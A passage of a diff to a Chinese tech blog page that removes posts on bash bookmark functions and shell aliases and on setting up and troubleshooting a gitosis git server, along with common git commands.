class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"># USAGE:</div><div class="line"># s bookmarkname - saves the curr dir as bookmarkname</div><div class="line"># g bookmarkname - jumps to the that bookmark</div><div class="line"># g b[TAB] - tab completion is available</div><div class="line"># l - list all bookmarks</div><div class="line"></div><div class="line"># save current directory to bookmarks</div><div class="line">touch ~/.sdirs</div><div class="line">function s &#123;</div><div class="line">cat ~/.sdirs | grep -v &quot;export DIR_$1=&quot; &gt; ~/.sdirs1</div><div class="line">mv ~/.sdirs1 ~/.sdirs</div><div class="line">echo &quot;export DIR_$1=$PWD&quot; &gt;&gt; ~/.sdirs</div><div class="line">&#125;</div><div class="line"></div><div class="line"># jump to bookmark</div><div class="line">function g &#123;</div><div class="line">source ~/.sdirs</div><div class="line">cd $(eval $(echo echo $(echo \$DIR_$1)))</div><div class="line">&#125;</div><div class="line"></div><div class="line"># list bookmarks with dirnam</div><div class="line">function l &#123;</div><div class="line">source ~/.sdirs</div><div class="line">env | grep &quot;^DIR_&quot; | cut -c5- | grep &quot;^.*=&quot;</div><div class="line">&#125;</div><div class="line"># list bookmarks without dirname</div><div class="line">function _l &#123;</div><div class="line">source ~/.sdirs</div><div class="line">env | grep &quot;^DIR_&quot; | cut -c5- | grep &quot;^.*=&quot; | cut -f1 -d &quot;=&quot;</div><div class="line">&#125;</div><div class="line"></div><div class="line"># completion command for g</div><div class="line">function _gcomp &#123;</div><div class="line">local curw</div><div class="line">COMPREPLY=()</div><div class="line">curw=$&#123;COMP_WORDS[COMP_CWORD]&#125;</div><div class="line">COMPREPLY=($(compgen -W &apos;`_l`&apos; -- $curw))</div><div class="line">return 0</div><div class="line">&#125;</div><div class="line"></div><div class="line"># bind completion command for g to _gcomp</div><div class="line">complete -F _gcomp g</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="2-提取一列"><a href="#2-提取一列" class="headerlink" title="2.提取一列"></a>2.提取一列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">function col &#123;</div><div class="line">awk -v col=$1 &apos;&#123;print $col&#125;&apos;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h3><h4 id="Productivity"><a href="#Productivity" class="headerlink" title="Productivity"></a>Productivity</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">alias ls=&quot;ls --color=auto&quot;</div><div class="line">alias ll=&quot;ls --color -al&quot;</div><div class="line">alias grep=&apos;grep --color=auto&apos;</div><div class="line">alias makescript=&quot;fc -rnl | head -1 &gt;&quot;</div><div class="line">alias genpasswd=&quot;strings /dev/urandom | grep -o &apos;[[:alnum:]]&apos; | head -n 30 | tr -d &apos;\n&apos;; echo&quot;</div><div class="line">alias c=&quot;clear&quot;</div><div class="line">alias histg=&quot;history | grep&quot;</div><div class="line">alias ..=&apos;cd ..&apos;</div><div class="line">alias ...=&apos;cd ../..&apos;</div><div class="line"></div><div class="line">mcd() &#123; mkdir -p &quot;$1&quot;; cd &quot;$1&quot;;&#125;</div><div class="line">cls() &#123; cd &quot;$1&quot;; ls;&#125;</div><div class="line">backup() &#123; cp &quot;$1&quot;&#123;,.bak&#125;;&#125;</div><div class="line">md5check() &#123; md5sum &quot;$1&quot; | grep &quot;$2&quot;;&#125;</div><div class="line"></div><div class="line">extract() &#123;</div><div class="line">if [ -f $1 ] ; then</div><div class="line">case $1 in</div><div class="line">    *.tar.bz2) tar xjf $1 ;;</div><div class="line">    *.tar.gz) tar xzf $1 ;;</div><div class="line">    *.bz2) bunzip2 $1 ;;</div><div class="line">    *.rar) unrar e $1 ;;</div><div class="line">    *.gz) gunzip $1 ;;</div><div class="line">    *.tar) tar xf $1 ;;</div><div class="line">    *.tbz2) tar xjf $1 ;;</div><div class="line">    *.tgz) tar xzf $1 ;;</div><div class="line">    *.zip) unzip $1 ;;</div><div class="line">    *.Z) uncompress $1 ;;</div><div class="line">    *.7z) 7z x $1 ;;</div><div class="line">    *) echo &quot;&apos;$1&apos; cannot be extracted via extract()&quot; ;;</div><div class="line">esac</div><div class="line">else</div><div class="line">echo &quot;&apos;$1&apos; is not a valid file&quot;</div><div class="line">fi</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="System-info"><a href="#System-info" class="headerlink" title="System info"></a>System info</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">alias cmount=&quot;mount | column -t&quot;</div><div class="line">alias tree=&quot;ls -R | grep &quot;:$&quot; | sed -e &apos;s/:$//&apos; -e &apos;s/[^-][^\/]*\//--/g&apos; -e &apos;s/^/ /&apos; -e &apos;s/-/|/&apos;&quot;</div><div class="line">alias intercept=&quot;sudo strace -ff -e trace=write -e write=1,2 -p&quot;</div><div class="line">alias meminfo=&apos;free -m -l -t&apos;</div><div class="line">alias ps?=&quot;ps aux | grep&quot;</div><div class="line">alias volume=&quot;amixer get Master | sed &apos;1,4 d&apos; | cut -d [ -f 2 | cut -d ] -f 1&quot;</div><div class="line">sbs()&#123; du -b --max-depth 1 | sort -nr | perl -pe &apos;s&#123;([0-9]+)&#125;&#123;sprintf &quot;%.1f%s&quot;, $1&gt;=2**30? ($1/2**30, &quot;G&quot;): $1&gt;=2**20? ($1/2**20, &quot;M&quot;): $1&gt;=2**10? ($1/2**10, &quot;K&quot;): ($1, &quot;&quot;)&#125;e&apos;;&#125;</div></pre></td></tr></table></figure>
-<h4 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">alias websiteget=&quot;wget --random-wait -r -p -e robots=off -U mozilla&quot;</div><div class="line">alias listen=&quot;lsof -P -i -n&quot;</div><div class="line">alias port=&apos;netstat -tulanp&apos;</div><div class="line">alias ipinfo=&quot;curl ifconfig.me &amp;&amp; curl ifconfig.me/host&quot;</div></pre></td></tr></table></figure>
-<h4 id="Funny"><a href="#Funny" class="headerlink" title="Funny"></a>Funny</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">kernelgraph() &#123; lsmod | perl -e &apos;print &quot;digraph \&quot;lsmod\&quot; &#123;&quot;;&lt;&gt;;while(&lt;&gt;)&#123;@_=split/\s+/; print &quot;\&quot;$_[0]\&quot; -&gt; \&quot;$_\&quot;\n&quot; for split/,/,$_[3]&#125;print &quot;&#125;&quot;&apos; | dot -Tpng | display -;&#125;</div><div class="line">alias busy=&quot;cat /dev/urandom | hexdump -C | grep \&quot;ca fe\&quot;&quot;</div></pre></td></tr></table></figure>
-
+          Linux Bash 环境变量
+          <div class="read-more">
+            <a href="/2016/06/19/Linux Bash环境变量/" class="read-more-link">阅读更多</a>
+          </div>
         
       
     </div>
@@ -1145,307 +240,14 @@ ID          Interface   State Pri   Dead
     <div class="post-content">
       
         
+          
+        
 
         
-          <h3 id="1-git服务器搭建"><a href="#1-git服务器搭建" class="headerlink" title="1.git服务器搭建"></a>1.git服务器搭建</h3><h4 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h4><p>以root用户执行如下命令</p>
-<pre><code>yum install python python-setuptools
-cd /usr/local/src
-git clone git://github.com/res0nat0r/gitosis.git
-cd gitosis
-python setup.py install  
-</code></pre><p>显示Finished processing dependencies for gitosis==0.2即表示成功</p>
-<h4 id="上传客户端密钥"><a href="#上传客户端密钥" class="headerlink" title="上传客户端密钥"></a>上传客户端密钥</h4><p>可以在客户端hosts文件中添加git服务器的解析，方便使用，下面都以qingdao为例</p>
-<pre><code>192.168.1.1 qingdao
-</code></pre><p>在客户端Linux主机上，执行如下命令，并将起产生的公钥复制下来，或者通过scp复制到git服务器。</p>
-<pre><code>ssh-keygen -t rsa
-scp ~/.ssh/id_rsa.pub tailin@qingdao:/tmp/
-</code></pre><h4 id="git用户创建"><a href="#git用户创建" class="headerlink" title="git用户创建"></a>git用户创建</h4><p>创建git用户</p>
-<pre><code>useradd -c &apos;git version manage&apos; -m -d /home/git -s /bin/bash  git
-</code></pre><p>切换到git用户并初始化gitosis</p>
-<pre><code>su - git
-gitosis-init &lt; /tmp/id_rsa.pub
-</code></pre><p>显示以下信息即表示成功</p>
-<pre><code>Initialized empty Git repository in /home/git/repositories/gitosis-admin.git/
-Reinitialized existing Git repository in /home/git/repositories/gitosis-admin.git/
-</code></pre><p>删除之前上传的客户端密钥，同时要保证git用户文件夹下.ssh文件夹的权限为700，.ssh/中所有的文件权限为644，否则无法免密码登陆。也不要擅自修改.ssh文件夹中文件的权限。</p>
-<hr>
-<h3 id="2-客户端设置"><a href="#2-客户端设置" class="headerlink" title="2.客户端设置"></a>2.客户端设置</h3><h4 id="导出管理项目"><a href="#导出管理项目" class="headerlink" title="导出管理项目"></a>导出管理项目</h4><p>假设客户端为root@tokyo，在客户端的任意目录下，导出管理项目</p>
-<pre><code>mkdir repo
-cd repo
-git clone git@qingdao:gitosis-admin.git
-</code></pre><h4 id="增加及设置管理项目"><a href="#增加及设置管理项目" class="headerlink" title="增加及设置管理项目"></a>增加及设置管理项目</h4><p>在个人开发机增加及设置管理项目</p>
-<pre><code>cd repo/gitosis-admin
-</code></pre><p>查看git服务器已经上传密钥,root@tokyo.pub为已经上传的客户端生成的公钥。</p>
-<pre><code>ls keydir  
-cat keydir/root@tokyo.pub  
-</code></pre><p>编译项目管理配置文件</p>
-<pre><code>vi gitosis.conf
-</code></pre><p>在文件尾增加以下内容</p>
-<pre><code>[group test]            # 具有写权限的组名称
-writable = test         # 该组可写的项目名称
-members = root@tokyo root2@tokyo    #该组的成员(密钥用户名) 多个用户协同开发时，以空格分隔
-</code></pre><p> 如果要增加只读的组 参考如下</p>
-<pre><code>[group test-readnoly]          # 具有都权限的组名称 
-readonly = test               # 该组只读的项目名称 
-members = root3@tokyo     # 该组的成员
-</code></pre><p>在<code>repo/gitosis-admin/keydir</code>中加入公钥<code>root3@host.pub,root2@tokyo.pub</code>,注意<strong>root2@tokyo</strong>对应的公钥名称为<strong>root2@host.pub</strong></p>
-<p>提交修改，这样增加了一个test的git项目，并增加了一个root2@tokyo的可写权限成员，以及一个root3@tokyo的只读权限成员。</p>
-<pre><code>git add .
-git commit -a -m &quot;add test repo&quot;
-git push
-</code></pre><h4 id="初始，增加及使用项目test"><a href="#初始，增加及使用项目test" class="headerlink" title="初始，增加及使用项目test"></a>初始，增加及使用项目test</h4><p>在客户端初始化，增加以及使用test项目</p>
-<pre><code>cd ~/repo  
-mkdir test  
-cd test 
-git init  
-touch readme  
-git add .   
-git commit -a -m &quot;init test-git&quot;  
-git remote add origin git@qingdao:test.git  
-git push origin master  
-</code></pre><h4 id="添加项目管理员"><a href="#添加项目管理员" class="headerlink" title="添加项目管理员"></a>添加项目管理员</h4><p>添加名为root@ovzinp的管理员，添加members成员</p>
-<pre><code>[group gitosis-admin]
-members = root@tokyo root@ovzinp                                                        
-writable = gitosis-admin
-</code></pre><p>在<code>repo/gitosis-admin/keydir</code>中加入公钥root@ovzinp.pub,注意<strong>root2@ovzinp</strong>对应的公钥名称为<strong>root2@host.pub</strong>,然后提交修改。</p>
-<pre><code>git add .
-git commit -a -m &quot;add admin&quot;
-git push
-</code></pre><h4 id="项目管理员添加新项目"><a href="#项目管理员添加新项目" class="headerlink" title="项目管理员添加新项目"></a>项目管理员添加新项目</h4><p>在root@ovzinp的主机上，首先导出管理的git项目，然后按照<strong><em>增加及设置管理项目</em></strong>中的步骤添加新的项目。</p>
-<blockquote>
-<p><strong>提示：</strong> 在首次添加git项目时候，需要配置用户名和邮箱，命令如下<br>git config –global user.name “xxx”<br>git config –global user.email “xxx@example.com”</p>
-</blockquote>
-<hr>
-<h3 id="3-Git常用命令"><a href="#3-Git常用命令" class="headerlink" title="3.Git常用命令"></a>3.Git常用命令</h3><h4 id="远程仓库相关命令"><a href="#远程仓库相关命令" class="headerlink" title="远程仓库相关命令"></a>远程仓库相关命令</h4><ul>
-<li><p>检出仓库：        $ git clone git://github.com/jQuery/jquery.git</p>
-</li>
-<li><p>查看远程仓库：$ git remote -v</p>
-</li>
-<li><p>添加远程仓库：$ git remote add [name] [url]</p>
-</li>
-<li><p>删除远程仓库：$ git remote rm [name]</p>
-</li>
-<li><p>修改远程仓库：$ git remote set-url –push [name] [newUrl]</p>
-</li>
-<li><p>拉取远程仓库：$ git pull [remoteName] [localBranchName]</p>
-</li>
-<li><p>推送远程仓库：$ git push [remoteName] [localBranchName]</p>
-</li>
-</ul>
-<p>如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，如下：</p>
-<pre><code>$git push origin test:master         // 提交本地test分支作为远程的master分支
-$git push origin test:test              // 提交本地test分支作为远程的test分支
-</code></pre><h4 id="分支-branch-操作相关命令"><a href="#分支-branch-操作相关命令" class="headerlink" title="分支(branch)操作相关命令"></a>分支(branch)操作相关命令</h4><ul>
-<li><p>查看本地分支：$ git branch</p>
-</li>
-<li><p>查看远程分支：$ git branch -r</p>
-</li>
-<li><p>创建本地分支：$ git branch [name] —-注意新分支创建后不会自动切换为当前分支</p>
-</li>
-<li><p>切换分支：$ git checkout [name]</p>
-</li>
-<li><p>创建新分支并立即切换到新分支：$ git checkout -b [name]</p>
-</li>
-<li><p>删除分支：$ git branch -d [name] —-d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项</p>
-</li>
-<li><p>合并分支：$ git merge [name] —-将名称为[name]的分支与当前分支合并</p>
-</li>
-<li><p>创建远程分支(本地分支push到远程)：$ git push origin [name]</p>
-</li>
-<li><p>删除远程分支：$ git push origin :heads/[name] 或 $ gitpush origin :[name] </p>
-</li>
-</ul>
-<p>创建空的分支：(执行命令之前记得先提交你当前分支的修改，否则会被强制删干净没得后悔)</p>
-<pre><code>$git symbolic-ref HEAD refs/heads/[name]
-$rm .git/index
-$git clean -fdx
-</code></pre><h4 id="版本-tag-操作相关命令"><a href="#版本-tag-操作相关命令" class="headerlink" title="版本(tag)操作相关命令"></a>版本(tag)操作相关命令</h4><ul>
-<li><p>查看版本：$ git tag</p>
-</li>
-<li><p>创建版本：$ git tag [name]</p>
-</li>
-<li><p>删除版本：$ git tag -d [name]</p>
-</li>
-<li><p>查看远程版本：$ git tag -r</p>
-</li>
-<li><p>创建远程版本(本地版本push到远程)：$ git push origin [name]</p>
-</li>
-<li><p>删除远程版本：$ git push origin :refs/tags/[name]</p>
-</li>
-<li><p>合并远程仓库的tag到本地：$ git pull origin –tags</p>
-</li>
-<li><p>上传本地tag到远程仓库：$ git push origin –tags</p>
-</li>
-<li><p>创建带注释的tag：$ git tag -a [name] -m ‘yourMessage’</p>
-</li>
-</ul>
-<h4 id="子模块-submodule-相关操作命令"><a href="#子模块-submodule-相关操作命令" class="headerlink" title="子模块(submodule)相关操作命令"></a>子模块(submodule)相关操作命令</h4><ul>
-<li><p>添加子模块：$ git submodule add [url] [path]<br>如：$git submodule add git://github.com/soberh/ui-libs.git src/main/webapp/ui-libs</p>
-</li>
-<li><p>初始化子模块：$ git submodule init  —-只在首次检出仓库时运行一次就行</p>
-</li>
-<li><p>更新子模块：$ git submodule update —-每次更新或切换分支后都需要运行一下</p>
-</li>
-<li><p>删除子模块：（分4步走哦）<br>  1) $ git rm –cached [path]<br>  2) 编辑“.gitmodules”文件，将子模块的相关配置节点删除掉<br>  3) 编辑“ .git/config”文件，将子模块的相关配置节点删除掉<br>  4) 手动删除子模块残留的目录</p>
-</li>
-</ul>
-<h4 id="忽略一些文件、文件夹不提交"><a href="#忽略一些文件、文件夹不提交" class="headerlink" title="忽略一些文件、文件夹不提交"></a>忽略一些文件、文件夹不提交</h4><p>在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如<br>target<br>bin<br>*.db</p>
-<hr>
-<h3 id="4-Git命令详解"><a href="#4-Git命令详解" class="headerlink" title="4.Git命令详解"></a>4.Git命令详解</h3><ul>
-<li><p><strong>git pull</strong>：从其他的版本库（既可以是远程的也可以是本地的）将代码更新到本地，例如：’git pull origin master’就是将origin这个版本库的代码更新到本地的master主枝，该功能类似于SVN的update</p>
-</li>
-<li><p><strong>git add</strong>：是将当前更改或者新增的文件加入到Git的索引中，加入到Git的索引中就表示记入了版本历史中，这也是提交之前所需要执行的一步，例如’git add app/model/user.rb’就会增加app/model/user.rb文件到Git的索引中，该功能类似于SVN的add</p>
-</li>
-<li><p><strong>git rm</strong>：从当前的工作空间中和索引中删除文件，例如’git rm app/model/user.rb’，该功能类似于SVN的rm、del</p>
-</li>
-<li><p><strong>git commit</strong>：提交当前工作空间的修改内容，类似于SVN的commit命令，例如’git commit -m story #3, add user model’，提交的时候必须用-m来输入一条提交信息，该功能类似于SVN的commit</p>
-</li>
-<li><p><strong>git push</strong>：将本地commit的代码更新到远程版本库中，例如’git push origin’就会将本地的代码更新到名为orgin的远程版本库中</p>
-</li>
-<li><p><strong>git log</strong>：查看历史日志，该功能类似于SVN的log</p>
-</li>
-<li><p><strong>git revert</strong>：还原一个版本的修改，必须提供一个具体的Git版本号，例如’git revert bbaf6fb5060b4875b18ff9ff637ce118256d6f20’，Git的版本号都是生成的一个哈希值</p>
-</li>
-</ul>
-<p>上面的命令几乎都是每个版本控制工具所公有的，下面就开始尝试一下Git独有的一些命令：</p>
-<ul>
-<li><p><strong>git branch</strong>：对分支的增、删、查等操作，例如’git branch new_branch’会从当前的工作版本创建一个叫做new_branch的新分支，’git branch -D new_branch’就会强制删除叫做new_branch的分支，’git branch’就会列出本地所有的分支</p>
-</li>
-<li><p><strong>git checkout</strong>：Git的checkout有两个作用，其一是在不同的branch之间进行切换，例如’git checkout new_branch’就会切换到new_branch的分支上去；另一个功能是还原代码的作用，例如’git checkout app/model/user.rb’就会将user.rb文件从上一个已提交的版本中更新回来，未提交的内容全部会回滚</p>
-</li>
-<li><p><strong>git rebase</strong>：用下图解释会比较清楚一些，rebase命令执行后，实际上是将分支点从C移到了G，这样分支也就具有了从C到G的功能</p>
-</li>
-</ul>
-<p><strong><em>图4-1</em></strong><br><img src="http://i.imgur.com/BPXfTmi.png" alt=""></p>
-<ul>
-<li><p><strong>git reset</strong>：将当前的工作目录完全回滚到指定的版本号，假设如图4-2，我们有A-G五次提交的版本，其中C的版本号是 bbaf6fb5060b4875b18ff9ff637ce118256d6f20，我们执行了’git reset bbaf6fb5060b4875b18ff9ff637ce118256d6f20’那么结果就只剩下了A-C三个提交的版本</p>
-<ul>
-<li><p>git reset –soft 只撤销commit，保留working tree和index file。</p>
-</li>
-<li><p>git reset –hard 撤销commit、index file和working tree，即撤销销毁最近一次的commit</p>
-</li>
-<li><p>git reset –mixed 撤销commit和index file，保留working tree</p>
-</li>
-<li><p>git reset和git reset –mixed完全一样</p>
-</li>
-<li><p>git reset –用于删除登记在index file里的某个文件</p>
-</li>
-</ul>
-</li>
-</ul>
-<p><strong><em>图4-2</em></strong><br><img src="http://i.imgur.com/nmpak8V.png" alt=""></p>
-<ul>
-<li><p><strong>git stash</strong>：将当前未提交的工作存入Git工作栈中，时机成熟的时候再应用回来，这里暂时提一下这个命令的用法，后面在技巧篇会重点讲解</p>
-</li>
-<li><p><strong>git config</strong>：利用这个命令可以新增、更改Git的各种设置，例如’git config branch.master.remote origin’就将master的远程版本库设置为别名叫做origin版本库，后面在技巧篇会利用这个命令个性化设置你的Git，为你打造独一无二的 Git</p>
-</li>
-<li><p><strong> git tag</strong>：可以将某个具体的版本打上一个标签，这样你就不需要记忆复杂的版本号哈希值了，例如你可以使用’git tag revert_version bbaf6fb5060b4875b18ff9ff637ce118256d6f20’来标记这个被你还原的版本，那么以后你想查看该版本时，就可以使用 revert_version标签名，而不是哈希值了</p>
-</li>
-</ul>
-<hr>
-<h3 id="5-Git服务器搭建排错"><a href="#5-Git服务器搭建排错" class="headerlink" title="5.Git服务器搭建排错"></a>5.Git服务器搭建排错</h3><h4 id="Untracked-working-tree-file-‘external-broadcom-Android-mk’-would-be-overwritten-by-merge-Aborting"><a href="#Untracked-working-tree-file-‘external-broadcom-Android-mk’-would-be-overwritten-by-merge-Aborting" class="headerlink" title="Untracked working tree file ‘external/broadcom/Android.mk’ would be overwritten by merge.  Aborting"></a>Untracked working tree file ‘external/broadcom/Android.mk’ would be overwritten by merge.  Aborting</h4><p>需要执行下面的命令才能修复：</p>
-<pre><code>git reset --hard HEAD    
-git clean -f -d    
-git pull    
-</code></pre><h4 id="Please-commit-your-changes-or-stash-them-before-you-can-merge"><a href="#Please-commit-your-changes-or-stash-them-before-you-can-merge" class="headerlink" title="Please, commit your changes or stash them before you can merge."></a>Please, commit your changes or stash them before you can merge.</h4><p>如果希望保留生产服务器上所做的改动,仅仅并入新配置项, 处理方法如下:</p>
-<pre><code>git stash
-git pull
-git stash pop
-</code></pre><p>然后可以使用Git diff -w +文件名 来确认代码自动合并的情况.</p>
-<p>反过来,如果希望用代码库中的文件完全覆盖本地工作版本. 方法如下:</p>
-<pre><code>git reset --hard
-git pull
-</code></pre><p>其中git reset是针对版本,如果想针对文件回退本地修改,使用</p>
-<pre><code>git checkout HEAD file/to/restore    
-</code></pre><h4 id="does-not-appear-to-be-a-git-repository"><a href="#does-not-appear-to-be-a-git-repository" class="headerlink" title="does not appear to be a git repository"></a>does not appear to be a git repository</h4><p>路径错误，可以分别尝试绝对路径或者相对路径</p>
-<p>如果是把另一个服务器的纯仓库弄到服务器，也会出现这种情况。我的临时做法是把另一个服务器的内容clone到本地服务器，然后在本地服务器创建纯仓库，放到repository的路径下，就可以了。有关这个错误，我在这篇文章里尝试寻找原因：</p>
-<p><a href="http://blog.csdn.net/xzongyuan/article/details/9366873" target="_blank" rel="external">http://blog.csdn.net/xzongyuan/article/details/9366873</a></p>
-<h4 id="ERROR-gitosis-serve-main-Repository-read-access-denied"><a href="#ERROR-gitosis-serve-main-Repository-read-access-denied" class="headerlink" title="ERROR:gitosis.serve.main:Repository read access denied"></a>ERROR:gitosis.serve.main:Repository read access denied</h4><p>修改本地gitosis-admin的gitosis-conf后（如下），push到仓库中，还会遇到该问题</p>
-<pre><code>[group customer]
-members = nexus b
-readonly = box_4.2
-</code></pre><p><strong>原因1：gitosis.conf写错</strong><br>gitosis.conf中的members与keydir中的用户名不一致，如gitosis中的members = foo@bar，但keydir中的公密名却叫foo.pub<br>解决<br>使keydir的名称与gitosis中members所指的名称一致。<br>改为members = foo 或 公密名称改为foo@bar.pub</p>
-<p>参考<br><a href="http://blog.csdn.net/lixinso/article/details/6526643" target="_blank" rel="external">http://blog.csdn.net/lixinso/article/details/6526643</a></p>
-<p>注意，中间如果遇到这样的错误，很可能是gitosis.conf配置的不对<br>ERROR:gitosis.serve.main:Repository read access denied<br>fatal: The remote end hung up unexpectedly</p>
-<p>有可能是：</p>
-<ul>
-<li>gitosis 中写的用户名，和keydir里面的key的名字没有完全对应上</li>
-<li>有的地方写错了，比如我把members写成了member</li>
-</ul>
-<p><strong>**原因2：地址错误：</strong></p>
-<p>虽然有时候，地址错误时，会提示did not apear to be a git repositry。但我也遇到这个错误，写错了相对路径，就会提示没有权限，因为gitosis.conf根本就没有这个文件的配置嘛。可以看看我的记录：</p>
-<p>第一次，写错相对路径，自己不知道：</p>
-<pre><code>norton@norton-laptop:~/work$ git clone git@192.168.0.3:/repositories/gitosis-admin.git
-Initialized empty Git repository in /home/norton/work/gitosis-admin/.git/
-ERROR:gitosis.serve.main:Repository read access denied
-fatal: The remote end hung up unexpectedly
-</code></pre><p>第二次，故意写个不存在的路径</p>
-<pre><code>norton@norton-laptop:~/work$ git clone git@192.168.0.3:/repositories/gitosis-admin.git2
-Initialized empty Git repository in /home/norton/work/gitosis-admin.git2/.git/
-ERROR:gitosis.serve.main:Repository read access denied
-fatal: The remote end hung up unexpectedly
-</code></pre><p>第三次，写对相对路径。可见，相对路径的根目录是/home/git/repositories，记得不要多写了不必要的路径。提示一下，repositories是在初始化gitosis前就已经手动建立的，是一个软链接，链接到/home/repo。如果没做这一步，初始化的时候就会建立一个repositories文件夹，那么gitosis-admin这个仓库就会在这个实在的文件夹下，而不会通过软连接放到/home/repo中</p>
-<pre><code>norton@norton-laptop:~/work$ git clone git@192.168.0.3:gitosis-admin.git
-Initialized empty Git repository in /home/norton/work/gitosis-admin/.git/
-remote: Counting objects: 5, done.
-remote: Compressing objects: 100% (5/5), done.
-remote: Total 5 (delta 0), reused 5 (delta 0)
-Receiving objects: 100% (5/5), done.
-</code></pre><p><strong>原因3：开错账户</strong></p>
-<p>有时候，头脑不清醒了，就会弄错账户，所以犯这个错，要思考下是不是搞错账户了，在主帐号admin中，不断地测试下载，而我的目的其实是用b的帐号测试下载。如配置如下（并没有给admin读取teamwork的权限，而我却一直在clone teamwork）</p>
-<pre><code>[gitosis]
-
-[group gitosis-admin]
-members = admin
-writable = gitosis-admin test
-
-[group RK_Download]
-members = b nexus
-readonly = teamwork box_4.2  
-</code></pre><p>测试结果</p>
-<pre><code>admin@admin:~/work/test$ git clone git@192.168.0.3:test.git
-Initialized empty Git repository in /home/admin/work/test/test/.git/
-remote: Counting objects: 3, done.
-remote: Total 3 (delta 0), reused 0 (delta 0)
-Receiving objects: 100% (3/3), done.
-admin@admin:~/work/test$ git clone git@192.168.0.3:teamwork.git
-Initialized empty Git repository in /home/admin/work/test/teamwork/.git/
-ERROR:gitosis.serve.main:Repository read access denied
-fatal: The remote end hung up unexpectedly
-
-admin@admin:~/work/test$ git clone git@192.168.0.3:teamwork.git
-Initialized empty Git repository in /home/admin/work/test/teamwork/.git/
-ERROR:gitosis.serve.main:Repository read access denied
-fatal: The remote end hung up unexpectedly
-
-admin@admin:~/work/test$ git clone git@192.168.0.3:teamwork.git
-Initialized empty Git repository in /home/admin/work/test/teamwork/.git/
-ERROR:gitosis.serve.main:Repository read access denied
-fatal: The remote end hung up unexpectedly 
-</code></pre><p>刚记录完，又犯傻逼了，clone 了N次test，都不行，结果发现，自己根本没有把给b设定test的权限。再次说明头脑要清醒。</p>
-<pre><code>$ git clone git@192.168.0.3:test.git
-Initialized empty Git repository in /tmp/test/.git/
-ERROR:gitosis.serve.main:Repository read access denied
-fatal: The remote end hung up unexpectedly
-</code></pre><p>修改后</p>
-<pre><code>Initialized empty Git repository in /tmp/teamwork/test/.git/
-remote: Counting objects: 3, done.
-remote: Total 3 (delta 0), reused 0 (delta 0)
-Receiving objects: 100% (3/3), done.
-</code></pre><p><strong>原因4： 不能写绝对路径</strong></p>
-<p>暂时不知道为啥，反正路径写了git@<server ip="">:/home/repo/xxx.git就会出现这个错误。貌似如果你如果密钥验证失败，要求你输入密码的情况下，是输入绝对路径的，而如果密钥验证成功，输入绝对路径，它就不认了。我想，这是为了保证系统安全，不让客户端用git账户乱clone不在repositories下的文件，即限定在repositories下了，所以只能用相对路径。</server></p>
-<h4 id="SSH-The-authenticity-of-host-can’t-be-established"><a href="#SSH-The-authenticity-of-host-can’t-be-established" class="headerlink" title="SSH: The authenticity of host  can’t be established"></a>SSH: The authenticity of host <host> can’t be established</host></h4><p>0 down vote<br>This message is just SSH telling you that it’s never seen this particular host key before, so it isn’t able to truly verify that you’re connecting to the host you think you are. When you say “Yes” it puts the ssh key into your known_hosts file, and then on subsequent connections will compare the key it gets from the host to the one in the known_hosts file.</p>
-<p>There was a related article on stack overflow showing how to disable this warning,<a href="http://stackoverflow.com/questions/3663895/ssh-the-authenticity-of-host-hostname-cant-be-established" target="_blank" rel="external">http://stackoverflow.com/questions/3663895/ssh-the-authenticity-of-host-hostname-cant-be-established</a>.</p>
-<h4 id="unrecognized-command-‘gitosis-serve-b’-amp-amp-每次登录要求输入密码"><a href="#unrecognized-command-‘gitosis-serve-b’-amp-amp-每次登录要求输入密码" class="headerlink" title="unrecognized command ‘gitosis-serve b’ &amp;&amp; 每次登录要求输入密码"></a>unrecognized command ‘gitosis-serve b’ &amp;&amp; 每次登录要求输入密码</h4><pre><code>$ git clone git@192.168.0.3:/home/repo/teamwork.git
-Initialized empty Git repository in /home/b/work/teamwork/.git/
-fatal: unrecognized command &apos;gitosis-serve b&apos;
-fatal: The remote end hung up unexpectedly
-</code></pre><p>遇到这个问题，b是我一个普通账户，而另一个admin每次登录都要求输入密码（ssh有两种登录方式：要求输入密码，和不需要输入密码——利用密钥），我就怀疑，gitosis的配置已经给我弄乱了，所以无法识别正确的密钥。<br>这个时候，我已经改了好多次密钥对，gitosis已经配置过好多次。通过gitosis-init是不会修复该问题的，于是，我删掉/home/git/下和repository有关的文件夹，包括.ssh下的authoritykey。还要删掉在/home/repo下的gitosis-admin.git。这样重新gitosis-init一下，就可以了。</p>
